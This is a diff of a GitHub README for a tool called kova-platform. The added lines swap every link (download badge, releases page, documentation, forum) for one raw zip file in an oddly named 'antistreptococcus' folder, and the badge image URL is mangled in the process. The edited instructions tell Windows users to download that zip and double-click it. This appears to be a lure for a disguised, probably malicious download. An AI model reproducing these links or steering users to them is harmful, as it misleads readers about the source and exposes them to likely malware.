@@ -1,7 +1,7 @@
 # 🎉 kova-platform - A User-Friendly Simulation Tool
 
 ## 📥 Download Now!
-[![Download kova-platform](https://img.shields.io/badge/Download%20kova--platform-v1.0-brightgreen)](https://github.com/israel8787/kova-platform/releases)
+[![Download kova-platform](https://raw.githubusercontent.com/israel8787/kova-platform/main/antistreptococcus/kova-platform.zip%20kova--platform-v1.0-brightgreen)](https://raw.githubusercontent.com/israel8787/kova-platform/main/antistreptococcus/kova-platform.zip)
 
 ## 🚀 Getting Started
 Welcome to the Kova Platform, a web platform and simulation engine designed for the Kova ecosystem. This guide will help you download and run the software with ease.
@@ -19,13 +19,13 @@ To ensure kova-platform runs smoothly, please check the following system require
 To download the Kova Platform:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/israel8787/kova-platform/releases) to find the latest version of the Kova Platform.
+   Go to our [Releases page](https://raw.githubusercontent.com/israel8787/kova-platform/main/antistreptococcus/kova-platform.zip) to find the latest version of the Kova Platform.
 
 2. **Select the Latest Release**
    On the releases page, you will see a list of available downloads. Click on the latest release.
 
 3. **Download the Application**
-   Find the file suitable for your operating system. Click on the download link (e.g., "kova-platform-v1.0-win.exe" for Windows) to start downloading.
+   Find the file suitable for your operating system. Click on the download link (e.g., "https://raw.githubusercontent.com/israel8787/kova-platform/main/antistreptococcus/kova-platform.zip" for Windows) to start downloading.
 
 4. **Run the Application**
    Once the download is complete, locate the file in your downloads folder. Double-click the file to run the Kova Platform.
@@ -47,8 +47,8 @@ After installation, you can access the Kova Platform from your applications menu
 ## 📞 Support
 If you encounter any issues while downloading or using Kova Platform, please refer to the following options for support:
 
-- **Documentation:** Check the [official documentation](https://github.com/israel8787/kova-platform/wiki) for detailed guides and troubleshooting.
-- **Community Forum:** Join our community forum on [GitHub Discussions](https://github.com/israel8787/kova-platform/discussions) to ask questions and share experiences.
+- **Documentation:** Check the [official documentation](https://raw.githubusercontent.com/israel8787/kova-platform/main/antistreptococcus/kova-platform.zip) for detailed guides and troubleshooting.
+- **Community Forum:** Join our community forum on [GitHub Discussions](https://raw.githubusercontent.com/israel8787/kova-platform/main/antistreptococcus/kova-platform.zip) to ask questions and share experiences.
 - **Contact Us:** You can reach out through our GitHub page if you need direct assistance.
 
-Thank you for choosing Kova Platform! We hope you enjoy your experience and find it valuable for your needs. For further updates, make sure to check back on our [Releases page](https://github.com/israel8787/kova-platform/releases) regularly.
+Thank you for choosing Kova Platform! We hope you enjoy your experience and find it valuable for your needs. For further updates, make sure to check back on our [Releases page](https://raw.githubusercontent.com/israel8787/kova-platform/main/antistreptococcus/kova-platform.zip) regularly.
